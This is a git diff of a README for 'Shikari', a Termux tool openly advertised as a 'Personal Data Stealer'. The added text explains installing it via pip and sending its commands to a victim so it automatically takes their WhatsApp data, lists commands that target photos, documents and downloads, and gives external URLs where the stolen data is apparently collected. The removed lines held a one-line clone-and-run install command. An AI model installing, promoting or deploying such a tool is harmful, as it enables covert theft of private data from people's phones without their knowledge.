@@ -1,21 +1,62 @@
-# Shikari
-Termux Hunter (Shikari) Tool : Hack Your Victim with Shikari
+<!--
+https://pypi.org/project/shikari/
+https://pypi.org/project/shikari/
+-->
 
-# Screenshot :
+[![](https://img.shields.io/pypi/pyversions/readme-generator.svg?longCache=True)](https://pypi.org/project/readme-generator/)
+
+#### Installation
+$ pip install shikari
+
+
+#### Features
++   **shikari**, Personal Data Stealer Termux Tool
+
+#### Screenshot :
 <a href="https://ibb.co/1sjMwKF"><img src="https://i.ibb.co/1sjMwKF/ss1.jpg" alt="ss1" border="0"></a>
 <a href="https://ibb.co/YPg0dp7"><img src="https://i.ibb.co/YPg0dp7/ss2.jpg" alt="ss2" border="0"></a>
 
-# Note :
-If yo don't know how to use or main use of Shikari then Ignore This Tool ^^
 
-# Youtue Video :
-https://www.youtube.com/watch?v=tksfK3CZvnc
+#### How to Use
++   **pip install shikari**
++   **shikari-whatsapp**
 
-# Shikari Data :
+Paste this two code in Termux Script and Send to your Victim !! then Shikari Automatically Shikar and Hack Victim whatsapp Data ^^
+
+
+
+#### Menu Options :
+
+$ shikari
+
+shikari-home
+shikari-dcim
+shikari-doc
+shikari-pic
+shikari-download
+shikari-whatsapp
+shikari-movie
+
+Created by Parixit Sutariya
+Github : github.com/Bhai4You
+Youtube : youtube.com/BullAnonymous
+
+
+
+#### How to Hack Whatsapp ?
+
+$ shikari-whatsapp
+
+Created by Parixit Sutariya
+Github : github.com/Bhai4You
+Youtube : youtube.com/BullAnonymous
+
+
+#### How to Download Shikari Data ?
 http://scnc.co.za/shikari.txt<br>
 http://ayk.co.za/shikari.txt<br>
 http://foodconsult.co.za/shikari.txt<br>
 
-# Installation
-### copy command line and paste in Termux
- apt update -y;apt -upgrade -y;apt install git -y;git clone https://github.com/Bhai4You/Shikari;cd Shikari;bash shikari.sh
+<p align="center">
+    <a href="https://pypi.org/project/shikari/">Shikari Tool</a>
+</p>
